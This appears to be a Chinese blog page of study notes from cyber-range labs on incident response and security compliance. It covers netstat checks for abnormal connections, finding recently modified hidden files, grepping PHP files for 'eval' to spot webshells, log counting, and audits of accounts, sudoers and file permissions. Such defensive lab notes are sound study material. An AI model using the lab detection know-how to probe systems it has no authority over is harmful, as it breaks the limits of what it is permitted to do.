

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/bz.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="z2zQAQ">
  <meta name="keywords" content="">
  
    <meta name="description" content="玄机和ichunqiu靶场记录">
<meta property="og:type" content="article">
<meta property="og:title" content="靶场">
<meta property="og:url" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/index.html">
<meta property="og:site_name" content="Welcome to my world">
<meta property="og:description" content="玄机和ichunqiu靶场记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/GSxkb1iVNo7s3dxL6nkcKAaonYi.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/H3efbvKvloVa4XxGDHWcNcdAnyb.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/JDrebv3Vvo1Gz9xyp6jcOMnJnMf.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/KzL5bLE0qoJCDoxIYzwcyF5mnQb.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/CvxDbdbYoo7e7xxC8xXcx2RSnid.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/G27ob7ITvoTlMCx6wkfc0X0Unzc.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214055854.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214240539.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214431332.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214956933.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214759525.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214823372.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706215941452.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706215835505.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706220212180.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706220505228.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706221648613.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240707152901974.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240707172838610.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240707173225213.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240707173251952.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104154012454.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104154154480.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104154739132.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104154859953.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104155117253.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104155534295.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104155838233.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104160913867.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104161634833.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104162919563.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104162530496.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104163118993.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104164036051.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104164222483.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241104164606565.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105221546610.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105221730360.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105233312172.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105233722116.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241105234232450.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106152541460.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154340082.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154304912.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154525954.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154816517.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106154711002.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106160048042.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106155308552.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106161717224.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106162034858.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106162336215.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106163100313.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106163400628.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106220635060.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106220826529.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106221721685.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106223542866.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106225005399.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241106234043842.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107000147043.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107000530691.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107001201646.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107141340678.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107142152004.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107143034770.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107145908508.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107150831524.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107151420868.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107151619059.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107151653157.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107152256502.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107154831851.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107155054216.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107160515386.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107160613580.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241107161804822.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108101011057.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108101942345.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108101829908.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108102204726.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108102404739.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103306212.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103400973.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103444009.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103504048.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108103935545.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108104255270.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108105126638.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108105323711.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108105741353.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108105825733.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108113617951.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241108113550386.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112151857463.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112152027355.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112152527136.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112152930939.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112153224439.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112153255276.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241112160151386.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114152154847.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114152343340.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114152718660.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114160018542.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114160724717.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241114162501036.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115154943338.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115155101882.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115155555520.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115160055948.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115160523067.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115161558953.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115161654237.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115163140719.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115163354768.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115170109853.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241115170215843.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118151916370.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118152046360.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118152239390.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118152850681.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118160210757.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118173604270.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241118174216674.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120095826399.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120095951290.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120100550341.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120100841192.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120141917493.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/20240124143239-5ee04ddc-ba82-1.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120142429062.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120142623207.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120144109238.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120144401211.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120145545582.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120145843227.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120151659060.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120153357742.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120153504419.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120155015769.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120160119896.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120161526677.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120161559555.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241120164637570.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241122165127294.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241122170246576.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241122173703193.png">
<meta property="og:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20241122173727242.png">
<meta property="article:published_time" content="2024-11-21T01:27:41.000Z">
<meta property="article:modified_time" content="2025-01-02T08:34:47.804Z">
<meta property="article:author" content="z2zQAQ">
<meta property="article:tag" content="内网渗透 应急响应">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2024/11/21/%E9%9D%B6%E5%9C%BA/GSxkb1iVNo7s3dxL6nkcKAaonYi.png">
  
  
  
  <title>靶场 - Welcome to my world</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/cloudedGlass.css">
<link rel="stylesheet" href="/z2z_custom/custom.css">
<link rel="stylesheet" href="/css/mac.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":80,"cursorChar":"__","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>z2zQAQ</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/moon.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="靶场"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-11-21 09:27" pubdate>
          2024年11月21日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          17k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          138 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">靶场</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="玄机"><a href="#玄机" class="headerlink" title="玄机"></a>玄机</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>netstat -pantu</code></p>
<p>-p 显示相关联的进程</p>
<p>-a 所有活动的连接,包括监听与被监听</p>
<p>-n 数字格式的ip端口而非进行域名解析</p>
<p>-t -u tcp udp</p>
<p><code>netstat -ano[b]</code></p>
<p>-a all：tcp udp</p>
<p>-n 数字格式的ip端口而非进行域名解析</p>
<p>-o 显示pid</p>
<p>-b 查看可执行程序</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;.*&quot;</span> -mtime -<span class="hljs-number">20</span> 寻找<span class="hljs-number">20</span>天内修改的隐藏文件（mmin也可以）<br><span class="hljs-built_in">find</span> . -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-built_in">exec</span> grep -Hn <span class="hljs-string">&#x27;eval&#x27;</span> &#123;&#125; \;<br></code></pre></td></tr></table></figure>

<p>打印出包含”eval”字符串的行及其所在的文件名（-Hn 选项）。{}代表 find 命令找到的文件名，;表示结束-exec 参数。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> access.<span class="hljs-built_in">log</span>.<span class="hljs-number">1</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;/index.php&quot;</span> | wc -<span class="hljs-keyword">l</span><br></code></pre></td></tr></table></figure>

<p>Wc -l 统计行数</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">cat access.log.1 |<span class="hljs-string"> grep xx&quot; </span>|<span class="hljs-string"> awk &#x27;&#123;print $x&#125;&#x27; </span>|<span class="hljs-string"> sort </span>|<span class="hljs-string"> uniq -c </span>|<span class="hljs-string"> sort -nr </span>|<span class="hljs-string"> head -n 10</span><br></code></pre></td></tr></table></figure>

<p>head 可以改成 more</p>
<p>sort 排序后 uniq -c 去除重复并且统计次数，最后 sort -n 按数字-r 降序排序</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">查看进程<br>ps -<span class="hljs-selector-tag">A</span> <br>ps aux<br><span class="hljs-attribute">top</span><br></code></pre></td></tr></table></figure>

<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/GSxkb1iVNo7s3dxL6nkcKAaonYi.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/H3efbvKvloVa4XxGDHWcNcdAnyb.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/JDrebv3Vvo1Gz9xyp6jcOMnJnMf.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p>利用-A -B -C 显示匹配字符串上下文 -rn 查找存在响应字符串的文件</p>
<p>awk ‘匹配规则 {操作}’ 文件</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/KzL5bLE0qoJCDoxIYzwcyF5mnQb.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h2 id="linux-挖矿"><a href="#linux-挖矿" class="headerlink" title="linux-挖矿"></a>linux-挖矿</h2><p>netstat -anplt 发现异常外联</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/CvxDbdbYoo7e7xxC8xXcx2RSnid.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/G27ob7ITvoTlMCx6wkfc0X0Unzc.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h2 id="linux-等保测评"><a href="#linux-等保测评" class="headerlink" title="linux-等保测评"></a>linux-等保测评</h2><p>用户密码过期时间</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214055854.png" srcset="/img/loading.gif" lazyload alt="image-20240706214055854"></p>
<p>密码到期规则</p>
<p>cat &#x2F;etc&#x2F;login.defs</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214240539.png" srcset="/img/loading.gif" lazyload alt="image-20240706214240539"></p>
<p>SSH版本</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214431332.png" srcset="/img/loading.gif" lazyload alt="image-20240706214431332"></p>
<p>检查passwd文件的权限</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214956933.png" srcset="/img/loading.gif" lazyload alt="image-20240706214956933"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214759525.png" srcset="/img/loading.gif" lazyload alt="image-20240706214759525"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706214823372.png" srcset="/img/loading.gif" lazyload alt="image-20240706214823372"></p>
<p>也就是 u&#x3D;rwx g&#x3D;r-x  o&#x3D;r-x  755</p>
<blockquote>
<p>为了实现对用户权限的访问控制，一般限制配置文件权限分配不超过644，可执行文件不超过755</p>
</blockquote>
<p>可疑用户检查</p>
<p>找到uid为0的用户</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706215941452.png" srcset="/img/loading.gif" lazyload alt="image-20240706215941452"></p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706215835505.png" srcset="/img/loading.gif" lazyload alt="image-20240706215835505"></p>
<p>权限分离</p>
<p>&#x2F;etc&#x2F;sudoers</p>
<p><img src="/2024/11/21/%E9%9D%B6%E5%9C%BA/image-20240706220212180.png" srcset="/img/loading.gif" lazyload alt="image-20240706220212180"></p>
<p>审计日志状态</p>
<p>systemctl status syslog</p>
